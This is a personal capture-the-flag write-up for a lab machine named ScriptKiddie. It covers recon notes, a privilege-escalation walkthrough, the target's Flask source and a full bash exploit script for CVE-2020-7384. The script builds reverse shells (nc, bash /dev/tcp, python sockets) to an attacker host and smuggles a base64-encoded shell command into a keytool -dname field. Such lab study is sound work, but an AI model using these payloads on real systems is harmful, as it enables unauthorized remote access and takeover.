# <span style="color:#3333FF">Machine #24 ScriptKiddie</span>  


## <span style="color:#3333FF">Checklist 🤓   

- [ ] Command injection in the `searchsploit` entry ( If I can evade the validation that is clearly set there).
- [ ] Code injection on either the payload or the nmap entries because they seem to be more of pure python than just os commands.
- [x] Vulnerability of the Werkzeug version we have ( But it needs DEBUG to be enabled and we don't have that).
- [ ] Look more into the msfvenom download a template thing. What does it mean? what is done with the file exactly in the backend.
- [ ] Research how to implement msfvenom using Python.

<br/><br/>


## <span style="color:#3333FF">What Do We Have? 🤔🤔 

* We have a web server on port 5000 that seems to be a tool for "hacking". It has:  
  * An nmap scanner (which could be implemented using a python library called `nmap` or sth similar to that).
  * An msfvenom payload creator which creates reverse shells that are valid for only 5 minutes. I can only make rev shells for Windows and Android, I can't seem to be able to make a rev shell for Linux eventho I'm not sure how vulnerable the machine would be if it already had a rev shell on it. The only thing I could think of is if I was able to execute the file that's a different story but the only path I had to the file is a path that forces me to download the file instead of opening it on the server.
  * A searchsploit tool that seems to be well validated for any use of special characters which limits my attempts to inject commands there.
  * In the msfvenom tool I have the ability to download a template (I'm not sure what that means I should look more into it).  
  * I seem to be able to open files on the service but not directories which means there's no directory traversal (I think).
  * This could be a password `OptString.new('PASS', [true, "The password to authenticate with", "nagiosadmin"]),`
<br/><br/>


## <span style="color:#3333FF">Random Notes👀
  
* The web server being used and the language version 
```
Werkzeug/0.16.1 Python/3.8.5
```   

* Scanlosers.sh seems to be exected when I use searchsploit to scan.  

<br/><br/>  


## <span style="color:#3333FF">How Did I Own This Shit 😎🥳  

1. Found an exploit for a specific version of msfvenom that is vulnerable to an RCE when we download a template apk file for an Android reverse shell (I'm not sure what the the apk code has exactly ).
2. So having an upload template option that uses msfvenom command after submitting it looked fitting to try with this vulnerability even when I wasn't sure of the msfvenom's version.
3. It worked and I got user shell.
4. It seemed that user pwn is promising so I easily injected a reverse shell in the `scanlosers.sh` file that didn't really have any validations and it executed when I tried to `searchsploit` on the website. What it does is try to scan "hackers'" ips from the log file "hackers" so I just injected the reverse shell inside the hackers file and it instantly executed the reverse shell and I got pwn.
5. Pwn seemed to have a sudo to `msfconsole` which gave me shell as root just by simply running it with the sudo command.  

<br/><br/>

## <span style="color:#3333FF">Writeups ✍🏽📓   


<br/><br/> 


```bash
echo -e "\n\x1B[31mCVE-2020-7384\e[0m"

echo -e "\nEnter the LHOST: "
read lhost
echo -e "\nEnter the LPORT: "
read lport

echo -e "\nSelect the payload type\n1. nc\n2. bash\n3. python\n4. python3\n"

read -p "select: " -e select
case $select in  
  1|nc) pyld="mkfifo /tmp/nbnvdoi; nc $lhost $lport 0</tmp/nbnvdoi | /bin/sh >/tmp/nbnvdoi 2>&1; rm /tmp/nbnvdoi" ;; 
  2|bash) pyld="/bin/bash -c \"/bin/bash -i >& /dev/tcp/$lhost/$lport 0>&1\"" ;;
  3|python) pyld="python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$lhost\",$lport));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" ;; 
  4|python3) pyld="python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$lhost\",$lport));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" ;; 
esac


payload="mkfifo /tmp/nbnvdoi; nc $lhost $lport 0</tmp/nbnvdoi | /bin/sh >/tmp/nbnvdoi 2>&1; rm /tmp/nbnvdoi"
payload_b64=$(echo $payload | base64 -w 0)
dname="CN='|echo $payload_b64 | base64 -d | sh #"

echo -e "\nEnter the Directory (absolute path) where you would like to save the apk file (Hit Enter to use the current directory): "
read directory

if [ -z "$directory" ]
then
      directory=$(pwd)
fi

cd $directory

rm signing.keystore 2> /dev/null
rm emptyfile 2> /dev/null
rm exploit.apk 2> /dev/null

# Touch empty_file
touch emptyfile

# Create apk_file
zip -j exploit.apk emptyfile

# Generate signing key with malicious -dname"
keytool -genkey -keystore signing.keystore -alias signing.key -storepass password -keypass password -keyalg RSA -keysize 2048 -dname "$dname"

# Sign APK using our malicious dname
jarsigner -sigalg SHA1withRSA -digestalg SHA1 -keystore signing.keystore -storepass password -keypass password exploit.apk signing.key && echo -e "\nNew APK file Generated\nLocation: \"$(pwd)/exploit.apk\"\n\nThe APK file generated could be now uploaded or used for exploitation\n\nIf you have access to the vulnerable machine then run:\nmsfvenom -x <your newly created apk> -p android/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -o /dev/null\n" || echo -n "\nSomething Went Wrong !!!\n"


```


```python
import datetime
import os
import random
import re
import subprocess
import tempfile
import time
from flask import Flask, render_template, request
from hashlib import md5
from werkzeug.utils import secure_filename


regex_ip = re.compile(r'^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$')
regex_alphanum = re.compile(r'^[A-Za-z0-9 \.]+$')
OS_2_EXT = {'windows': 'exe', 'linux': 'elf', 'android': 'apk'}

app = Flask(__name__)


@app.route('/', methods=['GET','POST'])
def index():
    if request.method == 'GET' or not 'action' in request.form:
        return render_template('index.html')
    elif request.form['action'] == 'scan':
        return scan(request.form['ip'])
    elif request.form['action'] == 'generate':
        return venom(request)
    elif request.form['action'] == 'searchsploit':
        return searchsploit(request.form['search'], request.remote_addr)
    print("no valid action")
    return request.form


def scan(ip):
    if regex_ip.match(ip):
        if not ip == request.remote_addr and ip.startswith('10.10.1') and not ip.startswith('10.10.10.'):
            stime = random.randint(200,400)/100
            time.sleep(stime)
            result = f"""Starting Nmap 7.80 ( https://nmap.org ) at {datetime.datetime.utcnow().strftime("%Y-%m-%d %H:%M")} UTC\nNote: Host seems down. If it is really up, but blocking our ping probes, try -Pn\nNmap done: 1 IP address (0 hosts up) scanned in {stime} seconds""".encode()
        else:
            result = subprocess.check_output(['nmap', '--top-ports', '100', ip])
        return render_template('index.html', scan=result.decode('UTF-8', 'ignore'))
    return render_template('index.html', scanerror="invalid ip")


def searchsploit(text, srcip):
    if regex_alphanum.match(text):
        result = subprocess.check_output(['searchsploit', '--color', text])
        return render_template('index.html', searchsploit=result.decode('UTF-8', 'ignore'))
    else:
        with open('/home/kid/logs/hackers', 'a') as f:
            f.write(f'[{datetime.datetime.now()}] {srcip}\n')
        return render_template('index.html', sserror="stop hacking me - well hack you back")


def venom(request):
    errors = []
    file = None
    if not 'lhost' in request.form:
        errors.append('lhost missing')
    else:
        lhost = request.form['lhost']
        if not regex_ip.match(lhost):
            errors.append('invalid lhost ip')
    if not 'os' in request.form:
        errors.append('os missing')
    else:
        tar_os = request.form['os']
        if tar_os not in ['windows', 'linux', 'android']:
            errors.append(f'invalid os: {tar_os}')
    if 'template' in request.files and request.files['template'].filename != '':
        file = request.files['template']
        if not ('.' in file.filename and file.filename.split('.')[-1] == OS_2_EXT[tar_os]):
            errors.append(f'{tar_os} requires a {OS_2_EXT[tar_os]} ext template file')
        else:
            template_name = secure_filename(file.filename)
            template_ext = file.filename.split('.')[-1]
            template_file = tempfile.NamedTemporaryFile('wb', suffix='.'+template_ext)
            file.save(template_file.name)
    else:
        template_name = "None"

    if errors:
        return render_template('index.html', payloaderror='<br/>\n'.join(errors))

    payload = f'{tar_os}/meterpreter/reverse_tcp'
    outfilename = md5(request.remote_addr.encode()).hexdigest()[:12] + '.' + OS_2_EXT[tar_os]
    outfilepath = os.path.join(app.root_path, 'static', 'payloads', outfilename)

    try:
        if file:
            print(f'msfvenom -x {template_file.name} -p {payload} LHOST={lhost} LPORT=4444')
            result = subprocess.check_output(['msfvenom', '-x', template_file.name, '-p',
                payload, f'LHOST={lhost}', 'LPORT=4444',
                '-o', outfilepath])
            template_file.close()
        else:
            result = subprocess.check_output(['msfvenom', '-p', payload,
                f'LHOST={lhost}', 'LPORT=4444', '-o', outfilepath])
    except subprocess.CalledProcessError:
        return render_template('index.html', payloaderror="Something went wrong")

    
    return render_template('index.html', payload=payload, lhost=lhost,
            lport=4444, template=template_name, fn=outfilename)


if __name__ == '__main__':
    app.run(host='0.0.0.0')
```

